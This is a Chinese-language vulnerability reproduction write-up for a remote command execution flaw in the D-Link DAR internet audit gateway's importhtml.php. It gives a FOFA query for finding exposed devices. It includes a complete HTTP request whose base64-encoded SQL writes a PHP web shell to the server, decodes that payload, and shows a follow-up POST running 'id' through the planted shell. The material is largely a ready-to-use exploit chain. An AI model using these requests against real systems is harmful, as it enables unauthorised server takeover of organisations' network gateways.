# D-Link DAR上网行为审计网关 importhtml远程命令执行漏洞

# 一、漏洞简介
D-Link DAR上网行为审计网关可以为企业提供完善的互联网访问行为管理解决方案，全面保护企业的运营效率和信息安全。DAR系列产品提供全面的应用识别和控制能力、精细化的应用层带宽管理能力、分类化的海量URL过滤能力、详尽的上网行为审计能力以及丰富的上网行为报表，从而帮助企业快速构建可视化、低成本以及高效安全的商业网络。D-Link上网行为管理系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ D-Link DAR上网行为审计网关

# 三、资产测绘
+ fofa`"mask.style.visibility" && title="D-Link"`
+ 特征

![1701832949924-a46cf09a-99f8-4b58-8e99-12b6d2b32a9d.png](./img/nel9FO4sfySh_L2i/1701832949924-a46cf09a-99f8-4b58-8e99-12b6d2b32a9d-620160.png)

# 四、漏洞复现
通过poc写入文件

```plain
GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Connection: close
```

![1701833120150-01db148e-b38f-49f0-b719-9df0ca2e651a.png](./img/nel9FO4sfySh_L2i/1701833120150-01db148e-b38f-49f0-b719-9df0ca2e651a-347119.png)

其中`c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn`是`select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/usr/hddocs/nsg/app/hellodlink.php'`的`base64`编码。

`0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e`为十六进制编码的字符串，表示以下代码

```plain
<?php echo system($_POST['cmd']);?>
```

写入文件位置

```plain
POST /app/hellodlink.php HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```

![1701833137853-b43067ed-7c29-4c0d-98cd-f3bb1eb417dc.png](./img/nel9FO4sfySh_L2i/1701833137853-b43067ed-7c29-4c0d-98cd-f3bb1eb417dc-690075.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qh15q6k18whqbdt8>